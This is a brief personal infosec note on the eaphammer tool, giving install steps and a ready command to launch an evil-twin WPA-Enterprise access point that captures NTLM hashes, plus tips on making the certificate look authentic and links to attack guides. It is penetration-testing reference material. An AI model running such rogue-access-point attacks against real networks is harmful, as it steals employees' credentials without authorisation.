---
Name: eaphammer
Platform: Linux
tags:
  - Resources
  - infosec
---
GitHub: https://github.com/s0lst1c3/eaphammer

------

- Allows you to attack enterprise networks and capture WPE NTLM hashes
- Evil twin but for WPE and is very useful since Radius is used we can capture NTLM hashes

To Install:

```ruby
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```

To setup and launch attack:

```ruby
# generate certificates
./eaphammer --cert-wizard

# launch attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```

Pretty straight forward. Certificate has to be modified to be more authentic and look as close as possible to the enterprise.

Some general WPA-Enterprise Resources:

- https://pwn.no0.be/exploitation/wifi/wpa_enterprise/
- https://ppn.snovvcrash.rocks/pentest/wi-fi/wpa-wpa2/enterprise
- https://adam-toscher.medium.com/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2
- https://xploitlab.com/eaphammer-targeted-evil-twin-attacks-against-wpa2-enterprise-networks/